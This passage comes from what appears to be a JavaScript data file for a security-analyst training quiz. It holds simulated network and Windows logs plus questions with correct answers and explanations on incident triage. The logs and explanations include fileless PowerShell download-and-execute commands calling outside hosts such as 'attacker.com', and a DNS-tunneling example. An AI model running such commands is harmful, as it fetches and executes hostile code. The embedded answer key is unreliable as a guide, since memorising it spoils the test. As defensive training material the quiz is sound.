            mitre: 'T1046',
            explanation: '🛡️ **Port Security Best Practices**: 1) **Least Privilege** - default deny, explicit allow (reduce attack surface by 80%+), 2) **Network Segmentation** - DMZ for public services, VLANs for different trust zones, prevent lateral movement, 3) **Continuous Monitoring** - NIDS/NIPS detect scans (nmap, masscan), SIEM correlates port anomalies, baseline normal traffic, 4) **Strong auth + encryption** - TLS/SSH for all services, MFA where possible, 5) **Patch management** - 60% of breaches exploit known CVEs in exposed services. **NOT obscurity** - port scanning takes seconds, non-standard ports delay attackers 0.01%. Defense = layers. MITRE: T1046 (Network Service Scanning - detection).'
        }
    ]
};

// Log Analysis Section (Realistic logs with multiple incidents)
const logAnalysisSection = {
    id: 'logs',
    title: 'Log Analysis Practical',
    points: 30,
    description: 'You are monitoring a corporate network. Analyze ALL log sources below and identify security incidents. Multiple attack techniques are present - correlation across log types is required.',
    logs: {
        firewall: `<span class="log-timestamp">2025-01-15 08:23:11</span> <span class="log-entry">ALLOW src=<span class="log-ip">192.168.10.45</span> dst=<span class="log-ip">8.8.8.8</span> proto=<span class="log-proto">UDP</span> dport=<span class="log-port">53</span></span>
<span class="log-timestamp">2025-01-15 08:23:12</span> <span class="log-entry">ALLOW src=<span class="log-ip">192.168.10.45</span> dst=<span class="log-ip">142.250.185.78</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">443</span></span>
<span class="log-timestamp">2025-01-15 09:15:33</span> <span class="log-entry warning">DENY src=<span class="log-ip">185.220.101.18</span> dst=<span class="log-ip">192.168.50.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">9001</span></span>
<span class="log-timestamp">2025-01-15 09:15:34</span> <span class="log-entry warning">DENY src=<span class="log-ip">185.220.101.18</span> dst=<span class="log-ip">192.168.50.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">9001</span></span>
<span class="log-timestamp">2025-01-15 10:42:08</span> <span class="log-entry critical">ALLOW src=<span class="log-ip">192.168.10.55</span> dst=<span class="log-ip">192.168.10.78</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">445</span></span>
<span class="log-timestamp">2025-01-15 10:42:15</span> <span class="log-entry critical">ALLOW src=<span class="log-ip">192.168.10.55</span> dst=<span class="log-ip">192.168.10.79</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">445</span></span>
<span class="log-timestamp">2025-01-15 10:42:22</span> <span class="log-entry critical">ALLOW src=<span class="log-ip">192.168.10.55</span> dst=<span class="log-ip">192.168.10.80</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">445</span></span>
<span class="log-timestamp">2025-01-15 11:08:41</span> <span class="log-entry critical">ALLOW src=<span class="log-ip">192.168.10.88</span> dst=<span class="log-ip">62.210.37.82</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">6667</span></span>
<span class="log-timestamp">2025-01-15 14:22:10</span> <span class="log-entry warning">DENY src=<span class="log-ip">203.0.113.45</span> dst=<span class="log-ip">198.51.100.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">22</span></span>
<span class="log-timestamp">2025-01-15 14:22:11</span> <span class="log-entry warning">DENY src=<span class="log-ip">203.0.113.45</span> dst=<span class="log-ip">198.51.100.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">23</span></span>
<span class="log-timestamp">2025-01-15 14:22:12</span> <span class="log-entry warning">DENY src=<span class="log-ip">203.0.113.45</span> dst=<span class="log-ip">198.51.100.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">25</span></span>
<span class="log-timestamp">2025-01-15 14:22:13</span> <span class="log-entry warning">DENY src=<span class="log-ip">203.0.113.45</span> dst=<span class="log-ip">198.51.100.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">80</span></span>`,

        webserver: `<span class="log-ip">192.168.10.45</span> - - [15/Jan/2025:08:23:15 +0000] "GET /index.html HTTP/1.1" 200 4523
<span class="log-ip">203.0.113.67</span> - - [15/Jan/2025:09:18:22 +0000] "GET /products?id=5 HTTP/1.1" 200 3201
<span class="log-ip">203.0.113.67</span> - - [15/Jan/2025:09:18:24 +0000] "GET /products?id=6 HTTP/1.1" 200 3198
<span class="log-ip">203.0.113.67</span> - - [15/Jan/2025:09:18:26 +0000] "GET /products?id=7 HTTP/1.1" 200 3205
<span class="log-ip">203.0.113.67</span> - - [15/Jan/2025:09:18:28 +0000] "GET /products?id=8 HTTP/1.1" 403 512
<span class="log-entry critical"><span class="log-ip">198.51.100.88</span> - - [15/Jan/2025:13:45:10 +0000] "POST /login HTTP/1.1" 401 89 "user=admin&pass=admin"</span>
<span class="log-entry critical"><span class="log-ip">198.51.100.88</span> - - [15/Jan/2025:13:45:12 +0000] "POST /login HTTP/1.1" 401 89 "user=admin&pass=password123"</span>
<span class="log-entry critical"><span class="log-ip">198.51.100.88</span> - - [15/Jan/2025:13:45:14 +0000] "POST /login HTTP/1.1" 401 89 "user=admin&pass=Welcome1"</span>
<span class="log-entry critical"><span class="log-ip">198.51.100.88</span> - - [15/Jan/2025:13:45:16 +0000] "POST /login HTTP/1.1" 200 1547 "user=admin&pass=Summer2024!"</span>`,

        windows: `EventID=4624 | LogonType=3 | User=CORP\\administrator | Source=<span class="log-ip">192.168.10.55</span> | Target=WKS-078 | Time=2025-01-15 10:42:08
EventID=4624 | LogonType=3 | User=CORP\\administrator | Source=<span class="log-ip">192.168.10.55</span> | Target=WKS-079 | Time=2025-01-15 10:42:15
EventID=4624 | LogonType=3 | User=CORP\\administrator | Source=<span class="log-ip">192.168.10.55</span> | Target=WKS-080 | Time=2025-01-15 10:42:22
EventID=4688 | Process=powershell.exe | CommandLine="IEX (New-Object Net.WebClient).DownloadString('http://62.210.37.82/script')" | User=jsmith | Host=WKS-088 | Time=2025-01-15 11:08:38
EventID=4720 | NewUser=svcbackup | CreatedBy=CORP\\jsmith | Host=DC-01 | Time=2025-01-15 11:15:22`,

        dns: `<span class="log-timestamp">2025-01-15 11:32:10</span> Query from <span class="log-ip">192.168.10.122</span>: af3b8x91mq.examplecorp.com → NXDOMAIN
<span class="log-timestamp">2025-01-15 11:32:15</span> Query from <span class="log-ip">192.168.10.122</span>: k9x2n4p8zq.examplecorp.com → NXDOMAIN
<span class="log-timestamp">2025-01-15 11:32:20</span> Query from <span class="log-ip">192.168.10.122</span>: 7mq3r5t2bw.examplecorp.com → NXDOMAIN
<span class="log-timestamp">2025-01-15 11:32:25</span> Query from <span class="log-ip">192.168.10.122</span>: p8v4c1x9nk.examplecorp.com → NXDOMAIN`,

        email: `From: billing@paypa1-secure.com | To: finance@company.com | Subject: Urgent Payment Verification Required | Time: 2025-01-15 09:05:12 | Attachments: invoice_Q4_2024.pdf.exe | Status: QUARANTINED
From: ceo@company.com | To: hr@company.com | Subject: Re: Q1 Budget Planning | Time: 2025-01-15 10:15:33 | Attachments: budget_2025.xlsx | Status: DELIVERED
From: support@company-vendors.com | To: it@company.com | Subject: System Maintenance Tonight | Time: 2025-01-15 14:08:44 | Attachments: maintenance_script.vbs | Status: DELIVERED`
    },
    questions: [
        {
            id: 'log1',
            question: 'Identify the THREE most critical incidents:',
            type: 'checkbox',
            options: [
                { value: 'brute', text: 'Brute force attack on web application login' },
                { value: 'lateral', text: 'SMB lateral movement across workstations' },
                { value: 'c2', text: 'Command & Control communication via IRC port 6667' },
                { value: 'portscan', text: 'External port scan attempt' },
                { value: 'tor', text: 'Tor network connection attempt' },
                { value: 'dga', text: 'DNS tunneling or DGA malware' },
                { value: 'idor', text: 'IDOR vulnerability testing' },
                { value: 'phish', text: 'Phishing email with malicious attachment' }
            ],
            correct: ['brute', 'lateral', 'c2'],
            points: 15,
            explanation: '🎯 TOP 3 CRITICAL (active compromises): 1) Brute force SUCCEEDED (HTTP 200 after failed 401s) - attacker has valid creds now. 2) SMB lateral movement 192.168.10.55→78/79/80 port 445 - attacker pivoting through network RIGHT NOW. 3) IRC C2 port 6667 - compromised host 192.168.10.88 beaconing to attacker. Lower severity: Port scan (reconnaissance only), Tor (blocked by firewall), DGA (no exfil yet), IDOR (testing/scanning), Phishing (quarantined by email gateway). Prioritize: Isolate .88 and .55 immediately, reset compromised credentials, hunt for additional compromised hosts.'
        },
        {
            id: 'log2',
            question: 'What is the MITRE ATT&CK technique for the SMB lateral movement?',
            type: 'radio',
            options: [
                { value: 't1021.002', text: 'T1021.002' },
                { value: 't1110', text: 'T1110' },
                { value: 't1071', text: 'T1071' },
                { value: 't1547', text: 'T1547' }
            ],
            correct: 't1021.002',
            points: 8,
            explanation: '📖 MITRE ATT&CK T1021.002 = Remote Services: SMB/Windows Admin Shares. Attacker uses compromised credentials (from brute force or credential dumping) to access hidden admin shares (\\\\target\\C$, \\\\target\\ADMIN$, \\\\target\\IPC$) on other workstations. Port 445 SMB traffic between workstations (not server→workstation) is HUGE red flag. Detection: Monitor EventID 4624 Type 3 (network logon), unusual SMB connections, psexec usage. Prevention: Disable SMB where not needed, restrict admin shares, implement lateral movement detection.'
        },
        {
            id: 'log3',
            question: 'Based on the Windows Event log, what suspicious action occurred on the domain controller DC-01?',
            type: 'radio',
            options: [
                { value: 'newuser', text: 'New user account "svcbackup" created by compromised user' },
                { value: 'passchange', text: 'Administrator password was changed' },
                { value: 'logoff', text: 'Suspicious logoff event' },
                { value: 'deletion', text: 'User account was deleted' }
            ],
            correct: 'newuser',
            points: 7,
            explanation: '⚠️ EventID 4720 = User Account Created on DC-01 (Domain Controller). "svcbackup" created by jsmith at 11:15:22 - right after lateral movement finished! Attacker playbook: 1) Compromise user (jsmith), 2) Lateral movement to workstations, 3) Escalate to Domain Admin, 4) Create backdoor domain account with service-sounding name (svcbackup, svcadmin, sqlsvc). This account will have domain-wide access for persistence. Action: Disable "svcbackup", reset all jsmith credentials, audit all accounts created in last 24hrs, check DC logs for privilege escalation (mimikatz, DCSync).'
        },
        {
            id: 'log4',
            question: 'What type of attack is indicated by sequential connection attempts to ports 22, 23, 25, 80?',
            type: 'radio',
            options: [
                { value: 'portscan', text: 'Port scanning/reconnaissance' },
                { value: 'ddos', text: 'DDoS attack' },
                { value: 'normal', text: 'Normal network traffic' },
                { value: 'malware', text: 'Malware propagation' }
            ],
            correct: 'portscan',
            points: 5,
            explanation: '🔍 Port Scan Detection: Sequential ports 22 (SSH), 23 (Telnet), 25 (SMTP), 80 (HTTP) in 3-second intervals = automated port scan. Source: 203.0.113.45. Pattern: Low → High port numbers, constant timing, multiple DENY logs. Tools: nmap, masscan, zmap. Response: All blocked by firewall (good), monitor for follow-up attacks if vulnerable service found. Low severity (reconnaissance only), but indicates active targeting. Log analysis: Group by source IP + short time window + multiple distinct ports = scan signature.'
        },
        {
            id: 'log5',
            question: 'The DNS log shows multiple NXDOMAIN responses for random-looking subdomains. What does this indicate?',
            type: 'radio',
            options: [
                { value: 'dga', text: 'Domain Generation Algorithm malware attempting C2' },
                { value: 'typo', text: 'User typing errors' },
                { value: 'normal', text: 'Normal DNS behavior' },
                { value: 'cache', text: 'DNS cache poisoning attempt' }
            ],
            correct: 'dga',
            points: 8,
            explanation: '🎲 DGA Detection: af3b8x91mq, k9x2n4p8zq, 7mq3r5t2bw, p8v4c1x9nk = high-entropy random subdomains. Pattern: Same host (192.168.10.122), all NXDOMAIN (failed lookups), 5-second intervals. DGA malware generates thousands of domains daily, tries to find one registered by attacker (needle in haystack). Examples: Conficker, Cryptolocker, Necurs. Detection: High NXDOMAIN rate, entropy analysis, Alexa top-1M comparison. Action: Isolate .122, memory analysis, check for malware (rootkit, trojan). MITRE T1568.002.'
        },
        {
            id: 'log6',
            question: 'What is suspicious about the email from "billing@paypa1-secure.com"?',
            type: 'checkbox',
            options: [
                { value: 'typosquat', text: 'Typosquatting domain (paypa1 vs paypal' },
                { value: 'doubleext', text: 'Double file extension .pdf.exe' },
                { value: 'urgency', text: 'Urgency tactic' },
                { value: 'quarantine', text: 'Email gateway correctly quarantined it' },
                { value: 'legitimate', text: 'Legitimate PayPal communication' }
            ],
            correct: ['typosquat', 'doubleext', 'urgency', 'quarantine'],
            points: 10,
            explanation: '🎣 Phishing Indicators: 1) **Typosquatting** - paypa1-secure.com (1 not l), attacker registers similar domain, 2) **Double extension** - invoice_Q4_2024.pdf.exe (Windows hides .exe by default, appears as PDF icon), 3) **Urgency** - psychological manipulation ("Urgent"), 4) **Quarantined** - email gateway caught it (GOOD!). Attack flow: User clicks → executes malware → credential theft, ransomware, banking trojan. Defense: User training (hover over links, check sender), email authentication (SPF/DKIM/DMARC), sandbox attachments. Real PayPal = paypal.com (no hyphens, no numbers).'
        },
        {
            id: 'log7',
            question: 'The PowerShell command line shows: IEX (New-Object Net.WebClient).DownloadString(...). What is this technique?',
            type: 'radio',
            options: [
                { value: 'fileless', text: 'Fileless malware execution' },
                { value: 'legitimate', text: 'Legitimate system administration' },
                { value: 'update', text: 'Windows Update process' },
                { value: 'backup', text: 'Automated backup script' }
            ],
            correct: 'fileless',
            points: 9,
            explanation: '👻 Fileless Attack: IEX = Invoke-Expression (execute string as code), Net.WebClient.DownloadString = download content from URL (http://62.210.37.82/script), executes in-memory WITHOUT writing to disk. Evades file-based AV. Next stage: Download Mimikatz, Empire, or ransomware. Correlation: Same host .88 later connects to IRC C2 port 6667 (likely downloaded trojan). Detection: PowerShell logging (EventID 4104 ScriptBlock), command-line auditing (Sysmon EventID 1), AMSI integration. Prevention: Constrained Language Mode, application whitelisting, disable PowerShell v2. MITRE T1059.001 + T1027.'
        },
        {
            id: 'log8',
            question: 'What is the correct incident response priority order for these threats?',
            type: 'radio',
            options: [
                { value: 'c2_lateral_brute', text: '1. C2 connection, 2. Lateral movement, 3. Brute force success' },
                { value: 'brute_scan_phish', text: '1. Brute force, 2. Port scan, 3. Phishing' },
                { value: 'all_equal', text: 'All equal priority' },
                { value: 'phish_first', text: '1. Phishing email, 2. Everything else' }
            ],
            correct: 'c2_lateral_brute',
            points: 8,
            explanation: '🚨 Triage Priority: **Active compromise > Successful attack > Attempted attack**. Order: 1) **C2 connection** (.88) - host actively controlled by attacker RIGHT NOW (isolate immediately), 2) **Lateral movement** (.55) - spreading through network (containment urgent), 3) **Brute force success** (.88) - compromised account (reset creds). Lower: Port scan (blocked, reconnaissance only), Phishing (quarantined, no impact), DGA (attempting C2, not yet successful), IDOR testing (scanning). NIST IR lifecycle: Detect → Contain → Eradicate → Recover. Focus: Stop active threats, prevent spread, then forensics.'
        },
        {
            id: 'log9',
            question: 'The firewall denies traffic from 185.220.101.18 to port 9001. What is significant about this IP?',
            type: 'radio',
            options: [
                { value: 'tor', text: 'Tor exit node IP range' },
                { value: 'botnet', text: 'Known botnet controller' },
                { value: 'vpn', text: 'Commercial VPN provider' },
                { value: 'cdn', text: 'CDN network' }
            ],
            correct: 'tor',
            points: 6,
            explanation: '🧅 Tor Detection: 185.220.101.0/24 = common Tor exit node range. Port 9001 = Tor directory/relay port. Inbound Tor = attacker hiding identity (could be legitimate whistleblower or attacker reconnaissance). Corporate policy: Usually block Tor (anonymity = security concern). Outbound Tor from internal host = data exfiltration, insider threat, or compromised host. Detection: Threat intel feeds (Tor exit node lists), GeoIP + known ranges. False positives: Privacy-conscious users, researchers. Block at firewall, monitor for circumvention (VPNs, proxies, DNS tunneling).'
        },
        {
            id: 'log10',
            question: 'Web server log shows IDOR pattern: /products?id=5,6,7,8. Why is id=8 response 403 Forbidden?',
            type: 'radio',
            options: [
                { value: 'authz', text: 'Authorization control working' },
                { value: 'deleted', text: 'Product deleted from database' },
                { value: 'error', text: 'Server error' },
                { value: 'attack', text: 'Attack blocked by WAF' }
            ],
            correct: 'authz',
            points: 6,
            explanation: '🔐 IDOR Testing: Attacker enumerates sequential IDs (5→6→7→8) looking for Insecure Direct Object Reference vulnerability. ID 8 returns 403 = access control working correctly (this product restricted). If all returned 200 → IDOR vulnerability (can access any product by changing ID). Real-world: Change /profile?user_id=123 to =124 to view other users. Testing pattern: Sequential requests, 2-second intervals, same IP. Severity: Low (defenses working). WAF rule: Rate limit sequential ID increments, alert on 403 patterns. OWASP A01:2021 Broken Access Control. Proper fix: Validate user permissions server-side, use UUIDs instead of sequential IDs.'
        },
        {
            id: 'log11',
            question: 'How many distinct hosts are compromised or suspicious based on all log sources?',
            type: 'radio',
            options: [
                { value: 'three', text: '3 hosts' },
                { value: 'two', text: '2 hosts' },
                { value: 'five', text: '5 hosts' },
                { value: 'one', text: '1 host' }
            ],
            correct: 'three',
            points: 7,
            explanation: '🖥️ Compromised Host Count: **192.168.10.55** (lateral movement source - SMB to .78/.79/.80), **192.168.10.88** (C2 IRC connection, fileless PowerShell download, likely brute force victim), **192.168.10.122** (DGA malware, attempting C2). External IPs: 203.0.113.67 (IDOR testing - attacker), 198.51.100.88 (brute force - attacker), 185.220.101.18 (Tor - blocked), 203.0.113.45 (port scan - blocked). Internal = compromised, External = attackers. Action: Isolate all 3 internal IPs, forensic analysis (memory dump, disk image), rebuild from known-good backup after root cause analysis.'
        },
        {
            id: 'log12',
            question: 'What Windows Event ID indicates successful network logon during lateral movement?',
            type: 'radio',
            options: [
                { value: '4624', text: 'EventID 4624' },
                { value: '4625', text: 'EventID 4625' },
                { value: '4720', text: 'EventID 4720' },
                { value: '4688', text: 'EventID 4688' }
            ],
            correct: '4624',
            points: 5,
            explanation: '📝 Windows Event 4624: Successful logon event. **LogonType 3** = Network logon (SMB, WMI, PsExec). Log shows: User=CORP\\administrator, Source=192.168.10.55, Target=WKS-078/079/080. Hunt query: EventID=4624 AND LogonType=3 AND unusual source/target pairs (workstation → workstation not normal, usually workstation → server). Other key events: **4625** (failed logon = brute force), **4672** (special privileges assigned = admin rights), **4720** (account created = persistence), **4688** (process created = execution). SIEM correlation: 4624 Type 3 + SMB port 445 + sequential targets = lateral movement detection rule.'
        },
        {
            id: 'log13',
            question: 'IRC port 6667 traffic indicates what type of malware infrastructure?',
            type: 'radio',
            options: [
                { value: 'c2', text: 'Command & Control server using IRC protocol' },
                { value: 'file', text: 'File transfer server' },
                { value: 'email', text: 'Email server' },
                { value: 'web', text: 'Web server' }
            ],
            correct: 'c2',
            points: 7,
            explanation: '💬 IRC C2: Port 6667 = Internet Relay Chat (text messaging protocol from 1990s). Attackers use IRC for C2 because: 1) Blends with legitimate traffic, 2) Real-time command channels, 3) Multi-bot coordination (botnets), 4) Encrypted/obfuscated variants exist. Modern C2: HTTP/HTTPS (443), DNS tunneling (53), cloud services (S3, Discord, Telegram). Detection: Unusual IRC traffic (corporate networks rarely use it), IRC from servers/workstations, external IRC destinations, IRC + other malware indicators. Mitigation: Block IRC at firewall (ports 6660-6669, 7000), monitor DNS for irc domains. Historic: Agobot, SDBot, Eggdrop botnets. MITRE T1071.001.'
        },
        {
            id: 'log14',
            question: 'The email from "support@company-vendors.com" contains maintenance_script.vbs and was DELIVERED. What should you do?',
            type: 'radio',
            options: [
                { value: 'investigate', text: 'Investigate urgently' },
                { value: 'ignore', text: 'Ignore' },
                { value: 'delete', text: 'Delete email only' },
                { value: 'archive', text: 'Archive for later review' }
            ],
            correct: 'investigate',
            points: 8,
            explanation: '⚠️ Delivered Threat: VBScript (.vbs) = Windows Script Host executable file (high risk). Email gateway DELIVERED it (not quarantined) = false negative. Red flags: 1) **VBS attachment** (legitimate admins use Group Policy, not email scripts), 2) **Generic sender** (support@company-vendors.com - not specific vendor), 3) **"Maintenance" social engineering** (urgency/authority). Actions: 1) Quarantine email from mailboxes, 2) Sandbox .vbs file (analyze behavior), 3) Check if any users opened attachment (EDR logs, EventID 4688 wscript.exe/cscript.exe), 4) Verify with IT if legitimate, 5) Update email gateway rules (.vbs should be blocked). VBS = common malware delivery (download Trojans, encrypt files, steal data).'
        },
        {
            id: 'log15',
            question: 'What is LogonType 3 in Windows Event 4624?',
            type: 'radio',
            options: [
                { value: 'network', text: 'Network logon' },
                { value: 'interactive', text: 'Interactive logon' },
                { value: 'service', text: 'Service startup' },
                { value: 'unlock', text: 'Screen unlock' }
            ],
            correct: 'network',
            points: 5,
            explanation: '🔢 Logon Types: **Type 2** = Interactive (console/RDP GUI), **Type 3** = Network (SMB shares, net use, PsExec without -i), **Type 4** = Batch (scheduled tasks), **Type 5** = Service (Windows service startup), **Type 7** = Unlock (workstation unlock), **Type 10** = RemoteInteractive (RDP/Terminal Services). Type 3 critical for lateral movement detection: Workstation → Workstation Type 3 = suspicious (normal: workstation → file server). Hunt: (SourceIP startswith "192.168.10." AND TargetIP startswith "192.168.10." AND LogonType=3 AND NOT (Target contains "SRV" or Target contains "DC")). Filter out legitimate: backup systems, monitoring tools, domain controllers.'
        },
        {
            id: 'log16',
            question: 'Successful brute force shows HTTP 200 after multiple 401s. What is the compromised credential?',
            type: 'radio',
            options: [
                { value: 'admin_summer', text: 'Username: admin, Password: Summer2024!' },
                { value: 'admin_admin', text: 'Username: admin, Password: admin' },
                { value: 'root', text: 'Username: root' },
                { value: 'unknown', text: 'Cannot determine from logs' }
            ],
            correct: 'admin_summer',
            points: 6,
            explanation: '🔓 Brute Force Success: Logs show POST /login with: admin/admin (401), admin/password123 (401), admin/Welcome1 (401), **admin/Summer2024!** (200). HTTP 200 = successful authentication. Attacker tried common passwords: admin, password123 (top 10 most common), Welcome1 (meets complexity but guessable), then succeeded with Summer2024! (seasonal password pattern). Actions: 1) **Disable admin account**, 2) Reset password, 3) Review admin account activity (EventID 4624), 4) Check for persistence (new accounts, scheduled tasks, services), 5) Implement: Account lockout (3-5 failed attempts), MFA, monitor failed logins, CAPTCHA after failures. Summer2024 = weak (predictable season+year pattern).'
        },
        {
            id: 'log17',
            question: 'What correlation links the PowerShell download to the IRC C2 connection?',
            type: 'radio',
            options: [
                { value: 'same_host', text: 'Same host and timing' },
                { value: 'same_user', text: 'Same username' },
                { value: 'same_port', text: 'Same port number' },
                { value: 'no_correlation', text: 'No correlation exists' }
            ],
            correct: 'same_host',
            points: 7,
            explanation: '🔗 Log Correlation: Host **192.168.10.88**: 11:08:38 PowerShell downloads script from 62.210.37.82 → 3 seconds later → 11:08:41 IRC connection to 62.210.37.82 port 6667. **Same external IP!** Attack chain: 1) User jsmith compromised (brute force), 2) PowerShell downloads IRC bot from attacker server, 3) Bot connects back to same server for C2. Correlation keys: IP address, timestamp proximity (seconds), host identifier. SIEM rule: Alert when (PowerShell download + outbound connection to same external IP within 60 seconds). This is kill chain visibility: Initial access → Execution → C2. Timeline analysis critical for incident reconstruction.'
        },
        {
            id: 'log18',
            question: 'The "svcbackup" account created on DC-01 indicates which stage of the attack lifecycle?',
            type: 'radio',
            options: [
                { value: 'persistence', text: 'Persistence' },
                { value: 'initial', text: 'Initial access' },
                { value: 'reconnaissance', text: 'Reconnaissance' },
                { value: 'impact', text: 'Impact/destruction' }
            ],
            correct: 'persistence',
            points: 7,
            explanation: '⏱️ Cyber Kill Chain - Persistence Stage: Account creation = establish foothold for long-term access. Attack progression: 1) **Initial Access** (brute force admin), 2) **Execution** (PowerShell fileless), 3) **Persistence** (create domain account on DC), 4) **Privilege Escalation** (domain admin rights), 5) **Lateral Movement** (SMB to workstations), 6) **C2** (IRC connection). "svcbackup" = service-sounding name (camouflage among legitimate service accounts: sqlsvc, backupadmin, svc_monitoring). Detection: Monitor EventID 4720 on DCs, new accounts with suspicious names/timing, accounts created by non-IT users, accounts added to Domain Admins (EventID 4728). MITRE T1136.002 (Create Account: Domain Account).'
        },
        {
            id: 'log19',
            question: 'Which external IP addresses are confirmed attackers (not blocked reconnaissance)?',
            type: 'checkbox',
            options: [
                { value: '198.51.100.88', text: '198.51.100.88' },
                { value: '62.210.37.82', text: '62.210.37.82' },
                { value: '203.0.113.67', text: '203.0.113.67' },
                { value: '203.0.113.45', text: '203.0.113.45 (port scan' },
                { value: '185.220.101.18', text: '185.220.101.18 (Tor' }
            ],
            correct: ['198.51.100.88', '62.210.37.82', '203.0.113.67'],
            points: 8,
            explanation: '🎯 Confirmed Attacker IPs: **198.51.100.88** - brute force SUCCEEDED (HTTP 200, gained access), **62.210.37.82** - hosts malware (PowerShell download) + C2 server (IRC), **203.0.113.67** - IDOR vulnerability scanning (application layer attack). Blocked/Lower severity: 203.0.113.45 (port scan denied by firewall), 185.220.101.18 (Tor denied). Actions: 1) Block attacker IPs at perimeter, 2) Threat intel enrichment (VirusTotal, AbuseIPDB, WHOIS), 3) Check for other connections to these IPs (SIEM search), 4) Report to abuse contacts/ISP, 5) Share IOCs (STIX/TAXII, MISP). Add to firewall blocklist, IDS signatures, proxy blacklist.'
        },
        {
            id: 'log20',
            question: 'What should be the FIRST action in incident response for this scenario?',
            type: 'radio',
            options: [
                { value: 'isolate', text: 'Isolate compromised hosts from network' },
                { value: 'collect', text: 'Collect forensic evidence first' },
                { value: 'notify', text: 'Notify management' },
                { value: 'restore', text: 'Restore from backup' }
            ],
            correct: 'isolate',
            points: 6,
            explanation: '🚨 NIST IR Phase - Containment: **Isolate immediately** (prevent spread, stop C2 communication, protect data). Active threats: C2 connection (can receive commands), lateral movement (spreading), compromised accounts (pivot to other systems). Containment methods: 1) **Network isolation** (firewall block, VLAN isolation, EDR quarantine), 2) Disable compromised accounts (admin, jsmith, svcbackup), 3) Block C2 IPs at perimeter. THEN: Evidence collection (memory dump while isolated), analysis, eradication, recovery. Forensic order: **Volatile data first** (RAM - processes, network connections) → disk → logs. Balance: Quick containment vs preserving evidence (live response tools like KAPE, Velociraptor).'
        },
        {
            id: 'log21',
            question: 'DNS queries with high-entropy random subdomains could also indicate:',
            type: 'checkbox',
            options: [
                { value: 'dga', text: 'Domain Generation Algorithm malware' },
                { value: 'tunneling', text: 'DNS tunneling' },
                { value: 'beaconing', text: 'DNS-based C2 beaconing' },
                { value: 'normal_cdn', text: 'Normal CDN traffic' },
                { value: 'cache', text: 'DNS cache warming' }
            ],
            correct: ['dga', 'tunneling', 'beaconing'],
            points: 8,
            explanation: '🌐 DNS Abuse Techniques: **DGA** - generate random domains to find C2 (Conficker, Cryptolocker), **DNS Tunneling** - encode data in subdomain (aGVsbG8=.evil.com = "hello" base64), **DNS C2** - commands in TXT records, responses encode instructions. Characteristics: High NXDOMAIN rate (DGA), long subdomain lengths (tunneling >63 chars), excessive query volume, suspicious TLDs. vs Normal: CDN = short predictable subdomains (cdn1.site.com), cache warming = internal queries. Detection: Entropy analysis (randomness score), query volume, payload size, NXDOMAIN ratio. Tools: PassiveDNS, DNS analytics, Zeek/Suricata DNS logs. Defense: DNS sinkhole, RPZ (Response Policy Zones), block suspicious TLDs (.tk, .gq), rate limiting.'
        },
        {
            id: 'log22',
            question: 'What MITRE ATT&CK tactic does the brute force attack represent?',
            type: 'radio',
            options: [
                { value: 'initial_access', text: 'TA0001' },
                { value: 'execution', text: 'TA0002' },
                { value: 'persistence', text: 'TA0003' },
                { value: 'lateral_movement', text: 'TA0008' }
            ],
            correct: 'initial_access',
            points: 6,
            explanation: '📖 MITRE ATT&CK Tactic **TA0001 Initial Access**: Get into the network. Technique **T1110 Brute Force** (sub-technique T1110.001 Password Guessing). Attacker tries common passwords against admin login to gain first foothold. After successful brute force → **TA0002 Execution** (PowerShell), **TA0003 Persistence** (create backdoor account), **TA0008 Lateral Movement** (SMB to other hosts), **TA0011 C2** (IRC communication). Tactics = WHY (goal), Techniques = HOW (method). Other Initial Access: Phishing (T1566), Exploit Public-Facing App (T1190), Valid Accounts (T1078). Map incidents to ATT&CK for: detection gap analysis, threat intel, EDR rule coverage.'
        },
        {
            id: 'log23',
            question: 'The PowerShell command uses "IEX". What does IEX stand for and why is it dangerous?',
            type: 'radio',
            options: [
                { value: 'invoke_expression', text: 'Invoke-Expression' },
                { value: 'internet_explorer', text: 'Internet Explorer Execution' },
                { value: 'index_extractor', text: 'Index Extractor' },
                { value: 'input_export', text: 'Input Export function' }
            ],
            correct: 'invoke_expression',
            points: 7,
            explanation: '⚡ PowerShell IEX: **Invoke-Expression** = execute string as PowerShell code. Danger: Enables fileless attacks (no .exe on disk). Pattern: IEX (DownloadString) = download malicious script → execute in memory → evades AV. Also seen: IEX(New-Object Net.WebClient).DownloadString(), IEX(iwr attacker.com/script), IEX $encodedCommand. Obfuscation: obfuscated IEX variants, item alias iex, scriptblock Create. Defense: **PowerShell logging** (Module Logging, ScriptBlock Logging EventID 4104), **Constrained Language Mode** (restrict dangerous cmdlets), **AMSI** (Antimalware Scan Interface - inspects scripts before execution), **Application Control** (deny unsigned scripts). Hunt: Get-WinEvent 4104 | Where {$_.Message -match "IEX"}.'
        },
        {
            id: 'log24',
            question: 'How can you verify if the "maintenance_script.vbs" email is legitimate?',
            type: 'checkbox',
            options: [
                { value: 'verify_sender', text: 'Contact IT/vendor directly via known phone number' },
                { value: 'check_spf', text: 'Check email headers' },
                { value: 'sandbox', text: 'Sandbox the .vbs file' },
                { value: 'reply_email', text: 'Reply to sender asking if legitimate' },
                { value: 'open_it', text: 'Open attachment to check contents' }
            ],
            correct: ['verify_sender', 'check_spf', 'sandbox'],
            points: 8,
            explanation: '✅ Email Verification: **Out-of-band verification** - call vendor using contact info from official website (NOT email signature/reply), **Email authentication** - check headers: SPF=pass, DKIM=pass, DMARC=pass (failed=spoofed), **Sandbox analysis** - execute .vbs in isolated VM (ANY.RUN, Joe Sandbox) to see behavior. DO NOT: Reply to email (attacker controls reply-to), click links, open attachments on production system. Tools: MXToolbox header analyzer, Message Header Analyzer (Microsoft), PhishTool. Legitimate: IT announces maintenance via ticketing system (ServiceNow), change management process, internal email (not external vendor domain). Social engineering relies on urgency bypassing verification.'
        },
        {
            id: 'log25',
            question: 'What is the significance of user "jsmith" appearing in both the PowerShell and DC-01 account creation logs?',
            type: 'radio',
            options: [
                { value: 'compromised_account', text: 'jsmith account is compromised' },
                { value: 'insider_threat', text: 'jsmith is definitely a malicious insider' },
                { value: 'legitimate', text: 'Legitimate administrator activity' },
